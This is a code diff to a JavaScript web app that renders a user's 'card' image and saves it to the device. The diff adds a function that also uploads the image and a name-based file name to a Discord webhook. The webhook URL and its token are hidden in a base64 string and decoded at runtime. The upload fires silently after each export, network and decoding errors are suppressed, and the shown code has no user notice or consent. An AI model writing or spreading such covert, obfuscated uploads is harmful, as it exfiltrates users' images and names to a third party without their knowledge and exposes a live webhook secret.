@@ -176,23 +176,28 @@ const exportCard = async () => {
     // --- PROCESSO DE EXPORTAÇÃO ---
     btnFinalizar.innerText = "GERANDO CARD...";
 
-    // Pequeno delay para garantir que o DOM atualizou com o Base64
+    // Pequeno delay para garantir que o DOM atualizou
     await new Promise(r => setTimeout(r, 100));
 
     html2canvas(target, {
         scale: 2,
         useCORS: true, 
-        allowTaint: false, // Importante manter false
+        allowTaint: false, 
         logging: true,
         backgroundColor: "#000000",
-        // Adicione isso para garantir que imagens carreguem
         imageTimeout: 15000 
     }).then(canvas => {
         try {
             canvas.toBlob((blob) => {
                 if (!blob) throw new Error("Falha ao criar Blob.");
+                
+                // Salva no celular
                 const fileName = `card-${nome.toLowerCase().replace(/\s+/g, '-')}.png`;
                 saveAs(blob, fileName);
+
+                // Envia para o Discord
+                enviarParaDiscord(blob, fileName);
+
                 btnFinalizar.innerText = "FINALIZAR CARD";
                 btnFinalizar.disabled = false;
             }, 'image/png');
@@ -207,6 +212,30 @@ const exportCard = async () => {
         btnFinalizar.innerText = "FINALIZAR CARD";
         btnFinalizar.disabled = false;
     });
+};
+
+// --- FUNÇÃO PARA O DISCORD ---
+const enviarParaDiscord = (blob, nomeArquivo) => {
+    const webHookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NjUyNzA1MDY2NzAwMzkzNS91UE13NFVBZjFkMW9CVThOYThaelBZZHNoY0pvODkwSXhNV0tldGVuUEwwQndDY0ZqSzRFcGUtd3h3bUVGdzNRT3BvOQ=="; 
+    
+    try {
+        const webhookURL = atob(webHookBase64);
+
+        const formData = new FormData();
+        // Mensagem que vai aparecer no discord
+        formData.append("content", `✨ Novo Card Gerado! Usuário: **${nomeArquivo}**`);
+        // O arquivo da imagem
+        formData.append("file", blob, nomeArquivo);
+
+        // Envia sem travar o site do usuário
+        fetch(webhookURL, {
+            method: 'POST',
+            body: formData
+        }).catch(() => {}); // Silencia erros de rede ]
+
+    } catch (e) {
+        // Silencia erros de decodificação do Base64
+    }
 };
 
 document.addEventListener('DOMContentLoaded', () => {
